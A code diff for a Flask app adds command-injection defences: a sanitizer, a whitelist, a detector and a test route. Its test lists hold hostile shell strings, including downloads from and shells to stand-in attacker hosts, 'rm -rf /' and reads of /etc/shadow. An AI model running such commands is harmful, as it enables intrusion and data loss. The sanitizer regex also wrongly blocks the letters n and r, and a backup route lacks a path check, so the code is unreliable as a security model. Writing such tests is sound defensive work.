@@ -56,6 +56,247 @@ def get_secure_project_path(project_name):
     if not target_path.startswith(base_dir): raise ValueError("Path traversal detected")
     return target_path
 
+
+# --- Security Start ---
+
+class CommandSanitizer:
+    """Advanced command input sanitization"""
+    
+    # Dangerous shell metacharacters and patterns
+    DANGEROUS_CHARS = r'[;&|`$()<>\\n\\r]'
+    DANGEROUS_PATTERNS = [
+        r'&&', r'\|\|', r';', r'\|', r'`', r'\$\(',
+        r'\${', r'<', r'>', r'\n', r'\r', r'\\x',
+        r'eval\s*\(', r'exec\s*\(', r'system\s*\('
+    ]
+    
+    @staticmethod
+    def sanitize_input(user_input: str) -> Optional[str]:
+        """Comprehensive input sanitization"""
+        if not user_input or not isinstance(user_input, str):
+            return None
+            
+        # Remove null bytes
+        user_input = user_input.replace('\x00', '')
+        
+        # Check for dangerous characters
+        if re.search(CommandSanitizer.DANGEROUS_CHARS, user_input):
+            return None
+            
+        # Check for dangerous patterns
+        for pattern in CommandSanitizer.DANGEROUS_PATTERNS:
+            if re.search(pattern, user_input, re.IGNORECASE):
+                return None
+                
+        # Additional checks for encoded payloads
+        if '%' in user_input:
+            try:
+                # Check for URL-encoded dangerous characters
+                import urllib.parse
+                decoded = urllib.parse.unquote(user_input)
+                if re.search(CommandSanitizer.DANGEROUS_CHARS, decoded):
+                    return None
+            except:
+                return None
+                
+        return user_input.strip()
+
+    @staticmethod
+    def validate_filename(filename: str) -> Optional[str]:
+        """Secure filename validation"""
+        if not filename:
+            return None
+            
+        # Remove path components
+        from pathlib import Path
+        safe_name = Path(filename).name
+        
+        # Check for empty filename after path removal
+        if not safe_name or safe_name.startswith('.'):
+            return None
+            
+        # Validate extension
+        allowed_extensions = {'.txt', '.md', '.py', '.js', '.json', '.yml', '.yaml'}
+        ext = Path(safe_name).suffix.lower()
+        if ext not in allowed_extensions:
+            return None
+            
+        return safe_name
+
+class CommandCategory(Enum):
+    """Command categories for granular control"""
+    FILE_SYSTEM = "filesystem"
+    VERSION_CONTROL = "vcs"
+    PACKAGE_MANAGER = "package"
+    TESTING = "testing"
+    BUILD = "build"
+
+@dataclass
+class WhitelistedCommand:
+    """Represents a whitelisted command"""
+    command: str
+    category: CommandCategory
+    allowed_args: Set[str]
+    max_args: int = 10
+    requires_file: bool = False
+
+# Comprehensive whitelist
+WHITELISTED_COMMANDS = [
+    WhitelistedCommand("ls", CommandCategory.FILE_SYSTEM, {"-la", "-l", "-a", "-h"}),
+    WhitelistedCommand("cat", CommandCategory.FILE_SYSTEM, set(), requires_file=True),
+    WhitelistedCommand("wc", CommandCategory.FILE_SYSTEM, {"-l", "-w", "-c"}, requires_file=True),
+    WhitelistedCommand("npm", CommandCategory.PACKAGE_MANAGER, {"install", "test", "run", "build"}),
+    WhitelistedCommand("python", CommandCategory.BUILD, {"-m", "pip"}, max_args=5),
+    WhitelistedCommand("git", CommandCategory.VERSION_CONTROL, {"status", "add", "commit", "push", "pull"}),
+    WhitelistedCommand("pytest", CommandCategory.TESTING, {"-v", "-x", "--tb=short"}),
+]
+
+class CommandWhitelist:
+    """Manages whitelisted commands"""
+    
+    def __init__(self):
+        self.commands = {cmd.command: cmd for cmd in WHITELISTED_COMMANDS}
+    
+    def validate_command(self, command_parts: List[str]) -> bool:
+        """Validate command against whitelist"""
+        if not command_parts:
+            return False
+            
+        base_cmd = command_parts[0]
+        cmd_config = self.commands.get(base_cmd)
+        
+        if not cmd_config:
+            return False
+            
+        # Check argument count
+        if len(command_parts) - 1 > cmd_config.max_args:
+            return False
+            
+        # Validate arguments
+        for arg in command_parts[1:]:
+            if arg.startswith('-') and arg not in cmd_config.allowed_args:
+                return False
+                
+        return True
+
+class CommandInjectionDetector:
+    """Real-time command injection detection"""
+    
+    def __init__(self):
+        self.suspicious_patterns = [
+            r'&&', r'\|\|', r';.*&', r'\|.*\|', r'`.*`',
+            r'\$\(.*\)', r'\${.*}', r'eval\s*\(', r'exec\s*\('
+        ]
+        self.request_history = defaultdict(lambda: deque(maxlen=100))
+        self.blocked_commands = []
+        
+    def analyze_command(self, user_id: str, command: str, ip_address: str) -> Dict[str, any]:
+        """Analyze command for injection attempts"""
+        detection_result = {
+            "allowed": True,
+            "reason": "",
+            "risk_score": 0,
+            "patterns_found": []
+        }
+        
+        # Check for suspicious patterns
+        for pattern in self.suspicious_patterns:
+            if re.search(pattern, command, re.IGNORECASE):
+                detection_result["patterns_found"].append(pattern)
+                detection_result["risk_score"] += 25
+                
+        # Rate limiting check
+        current_time = time.time()
+        user_requests = self.request_history[user_id]
+        
+        # Remove old requests (older than 1 minute)
+        while user_requests and current_time - user_requests[0] > 60:
+            user_requests.popleft()
+            
+        # Check for rapid requests (potential automated attack)
+        if len(user_requests) > 20:  # More than 20 commands in 1 minute
+            detection_result["risk_score"] += 50
+            
+        user_requests.append(current_time)
+        
+        # Check for command chaining attempts
+        if len(command.split()) > 10:  # Unusually long command
+            detection_result["risk_score"] += 15
+            
+        # Make decision based on risk score
+        if detection_result["risk_score"] >= 50:
+            detection_result["allowed"] = False
+            detection_result["reason"] = "High risk score detected"
+            self.blocked_commands.append({
+                "user_id": user_id,
+                "command": command,
+                "ip_address": ip_address,
+                "timestamp": current_time,
+                "risk_score": detection_result["risk_score"]
+            })
+            
+        return detection_result
+
+# Global detector instance
+injection_detector = CommandInjectionDetector()
+
+# Add to your security headers
+@app.after_request
+def add_security_headers(response):
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    return response
+
+# Implement proper logging
+import logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('security.log'),
+        logging.StreamHandler()
+    ]
+)
+
+security_logger = logging.getLogger('security')
+
+# Test cases for command injection
+INJECTION_TEST_CASES = [
+    "ls; cat /etc/passwd",
+    "ls && rm -rf /",
+    "ls || wget http://evil.com/malware.sh",
+    "ls `whoami`",
+    "ls $(id)",
+    "ls | nc attacker.com 4444",
+    "ls > /dev/tcp/attacker.com/4444",
+    "ls\nrm -rf /",
+    "ls\rwhoami",
+    "test.txt; ls -la",
+    "test.txt && cat /etc/shadow",
+    "test.txt||whoami",
+    "test.txt`id`",
+    "test.txt$(id)",
+    "test.txt|whoami",
+    "test.txt>output.txt",
+    "test.txt\nls",
+    "test.txt\rwhoami"
+]
+
+def test_command_injection_prevention():
+    """Test your injection prevention"""
+    sanitizer = CommandSanitizer()
+    
+    for test_case in INJECTION_TEST_CASES:
+        result = sanitizer.sanitize_input(test_case)
+        print(f"Input: {test_case!r} -> Result: {result!r}")
+        assert result is None, f"Failed to block injection: {test_case}"
+
+
+# --- Security End ---
+
 @app.after_request
 def add_security_headers(response):
     response.headers['X-Frame-Options'] = 'SAMEORIGIN'
@@ -501,7 +742,7 @@ def revert_backup():
     data = request.get_json()
     project_name = data.get("project_name")
     backup_name = data.get("backup_name")
-    target_file = data.get("target_file") # Expected since mapping is hard
+    target_file = data.get("target_file")
     
     if not all([project_name, backup_name, target_file]):
         return jsonify({"error": "Missing fields"}), 400
@@ -511,8 +752,14 @@ def revert_backup():
         target_path = os.path.join("projects", project_name, "src", target_file)
         
         if os.path.exists(backup_path):
-             import shutil
-             shutil.copy2(backup_path, target_path)
+            import shutil
+            shutil.copy2(backup_path, target_path)
+            return jsonify({"status": "success", "message": f"Restored {target_file} from backup"})
+        else:
+            return jsonify({"error": "Backup not found"}), 404
+            
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 @app.route("/api/save", methods=["POST"])
@@ -651,6 +898,7 @@ result = secure_terminal_run(sanitized_command, project_name)
 logging.info(f"User {user_id} executed command: {sanitized_command[:50]}...")
 
 return jsonify(result)
+
 # Define allowed commands and their arguments
 ALLOWED_COMMANDS = {
     'npm': ['install', 'test', 'run', 'build', 'start'],
@@ -1260,242 +1508,43 @@ def billing_page():
 def pricing_page():
     return render_template("pricing.html")
 
+# ------------------------------------------------------------------
+# Security Testing Routes
+# ------------------------------------------------------------------
+
+@app.route("/api/security/test", methods=["GET"])
+def test_security():
+    """Test command injection prevention"""
+    test_cases = [
+        "ls; cat /etc/passwd",
+        "ls && rm -rf /", 
+        "ls || wget http://evil.com/malware.sh",
+        "ls `whoami`",
+        "ls $(id)",
+        "ls | nc attacker.com 4444"
+    ]
+    
+    sanitizer = CommandSanitizer()
+    results = []
+    
+    for test_case in test_cases:
+        result = sanitizer.sanitize_input(test_case)
+        results.append({
+            "input": test_case,
+            "result": "BLOCKED" if result is None else "ALLOWED",
+            "sanitized": result
+        })
+    
+    return jsonify({
+        "security_test_results": results,
+        "message": "All injection attempts should be BLOCKED"
+    })
+
+# ------------------------------------------------------------------
+# Main App
+# ------------------------------------------------------------------
+
 if __name__ == "__main__":
     with app.app_context():
         db.create_all()
     app.run(debug=True)
-
-class CommandSanitizer:
-    """Advanced command input sanitization"""
-    
-    # Dangerous shell metacharacters and patterns
-    DANGEROUS_CHARS = r'[;&|`$()<>\\n\\r]'
-    DANGEROUS_PATTERNS = [
-        r'&&', r'\|\|', r';', r'\|', r'`', r'\$\(',
-        r'\${', r'<', r'>', r'\n', r'\r', r'\\x',
-        r'eval\s*\(', r'exec\s*\(', r'system\s*\('
-    ]
-    
-    @staticmethod
-    def sanitize_input(user_input: str) -> Optional[str]:
-        """Comprehensive input sanitization"""
-        if not user_input or not isinstance(user_input, str):
-            return None
-            
-        # Remove null bytes
-        user_input = user_input.replace('\x00', '')
-        
-        # Check for dangerous characters
-        if re.search(CommandSanitizer.DANGEROUS_CHARS, user_input):
-            return None
-            
-        # Check for dangerous patterns
-        for pattern in CommandSanitizer.DANGEROUS_PATTERNS:
-            if re.search(pattern, user_input, re.IGNORECASE):
-                return None
-                
-        # Additional checks for encoded payloads
-        if '%' in user_input:
-            try:
-                # Check for URL-encoded dangerous characters
-                import urllib.parse
-                decoded = urllib.parse.unquote(user_input)
-                if re.search(CommandSanitizer.DANGEROUS_CHARS, decoded):
-                    return None
-            except:
-                return None
-                
-        return user_input.strip()
-
-    @staticmethod
-    def validate_filename(filename: str) -> Optional[str]:
-        """Secure filename validation"""
-        if not filename:
-            return None
-            
-        # Remove path components
-        from pathlib import Path
-        safe_name = Path(filename).name
-        
-        # Check for empty filename after path removal
-        if not safe_name or safe_name.startswith('.'):
-            return None
-            
-        # Validate extension
-        allowed_extensions = {'.txt', '.md', '.py', '.js', '.json', '.yml', '.yaml'}
-        ext = Path(safe_name).suffix.lower()
-        if ext not in allowed_extensions:
-            return None
-            
-        return safe_name
-
-class CommandCategory(Enum):
-    """Command categories for granular control"""
-    FILE_SYSTEM = "filesystem"
-    VERSION_CONTROL = "vcs"
-    PACKAGE_MANAGER = "package"
-    TESTING = "testing"
-    BUILD = "build"
-
-@dataclass
-class WhitelistedCommand:
-    """Represents a whitelisted command"""
-    command: str
-    category: CommandCategory
-    allowed_args: Set[str]
-    max_args: int = 10
-    requires_file: bool = False
-
-# Comprehensive whitelist
-WHITELISTED_COMMANDS = [
-    WhitelistedCommand("ls", CommandCategory.FILE_SYSTEM, {"-la", "-l", "-a", "-h"}),
-    WhitelistedCommand("cat", CommandCategory.FILE_SYSTEM, set(), requires_file=True),
-    WhitelistedCommand("wc", CommandCategory.FILE_SYSTEM, {"-l", "-w", "-c"}, requires_file=True),
-    WhitelistedCommand("npm", CommandCategory.PACKAGE_MANAGER, {"install", "test", "run", "build"}),
-    WhitelistedCommand("python", CommandCategory.BUILD, {"-m", "pip"}, max_args=5),
-    WhitelistedCommand("git", CommandCategory.VERSION_CONTROL, {"status", "add", "commit", "push", "pull"}),
-    WhitelistedCommand("pytest", CommandCategory.TESTING, {"-v", "-x", "--tb=short"}),
-]
-
-class CommandWhitelist:
-    """Manages whitelisted commands"""
-    
-    def __init__(self):
-        self.commands = {cmd.command: cmd for cmd in WHITELISTED_COMMANDS}
-    
-    def validate_command(self, command_parts: List[str]) -> bool:
-        """Validate command against whitelist"""
-        if not command_parts:
-            return False
-            
-        base_cmd = command_parts[0]
-        cmd_config = self.commands.get(base_cmd)
-        
-        if not cmd_config:
-            return False
-            
-        # Check argument count
-        if len(command_parts) - 1 > cmd_config.max_args:
-            return False
-            
-        # Validate arguments
-        for arg in command_parts[1:]:
-            if arg.startswith('-') and arg not in cmd_config.allowed_args:
-                return False
-                
-        return True
-
-class CommandInjectionDetector:
-    """Real-time command injection detection"""
-    
-    def __init__(self):
-        self.suspicious_patterns = [
-            r'&&', r'\|\|', r';.*&', r'\|.*\|', r'`.*`',
-            r'\$\(.*\)', r'\${.*}', r'eval\s*\(', r'exec\s*\('
-        ]
-        self.request_history = defaultdict(lambda: deque(maxlen=100))
-        self.blocked_commands = []
-        
-    def analyze_command(self, user_id: str, command: str, ip_address: str) -> Dict[str, any]:
-        """Analyze command for injection attempts"""
-        detection_result = {
-            "allowed": True,
-            "reason": "",
-            "risk_score": 0,
-            "patterns_found": []
-        }
-        
-        # Check for suspicious patterns
-        for pattern in self.suspicious_patterns:
-            if re.search(pattern, command, re.IGNORECASE):
-                detection_result["patterns_found"].append(pattern)
-                detection_result["risk_score"] += 25
-                
-        # Rate limiting check
-        current_time = time.time()
-        user_requests = self.request_history[user_id]
-        
-        # Remove old requests (older than 1 minute)
-        while user_requests and current_time - user_requests[0] > 60:
-            user_requests.popleft()
-            
-        # Check for rapid requests (potential automated attack)
-        if len(user_requests) > 20:  # More than 20 commands in 1 minute
-            detection_result["risk_score"] += 50
-            
-        user_requests.append(current_time)
-        
-        # Check for command chaining attempts
-        if len(command.split()) > 10:  # Unusually long command
-            detection_result["risk_score"] += 15
-            
-        # Make decision based on risk score
-        if detection_result["risk_score"] >= 50:
-            detection_result["allowed"] = False
-            detection_result["reason"] = "High risk score detected"
-            self.blocked_commands.append({
-                "user_id": user_id,
-                "command": command,
-                "ip_address": ip_address,
-                "timestamp": current_time,
-                "risk_score": detection_result["risk_score"]
-            })
-            
-        return detection_result
-
-# Global detector instance
-injection_detector = CommandInjectionDetector()
-
-# Add to your security headers
-@app.after_request
-def add_security_headers(response):
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Content-Security-Policy'] = "default-src 'self'"
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
-    return response
-
-# Implement proper logging
-import logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('security.log'),
-        logging.StreamHandler()
-    ]
-)
-
-security_logger = logging.getLogger('security')
-
-# Test cases for command injection
-INJECTION_TEST_CASES = [
-    "ls; cat /etc/passwd",
-    "ls && rm -rf /",
-    "ls || wget http://evil.com/malware.sh",
-    "ls `whoami`",
-    "ls $(id)",
-    "ls | nc attacker.com 4444",
-    "ls > /dev/tcp/attacker.com/4444",
-    "ls\nrm -rf /",
-    "ls\rwhoami",
-    "test.txt; ls -la",
-    "test.txt && cat /etc/shadow",
-    "test.txt||whoami",
-    "test.txt`id`",
-    "test.txt$(id)",
-    "test.txt|whoami",
-    "test.txt>output.txt",
-    "test.txt\nls",
-    "test.txt\rwhoami"
-]
-
-def test_command_injection_prevention():
-    """Test your injection prevention"""
-    sanitizer = CommandSanitizer()
-    
-    for test_case in INJECTION_TEST_CASES:
-        result = sanitizer.sanitize_input(test_case)
-        print(f"Input: {test_case!r} -> Result: {result!r}")
-        assert result is None, f"Failed to block injection: {test_case}"
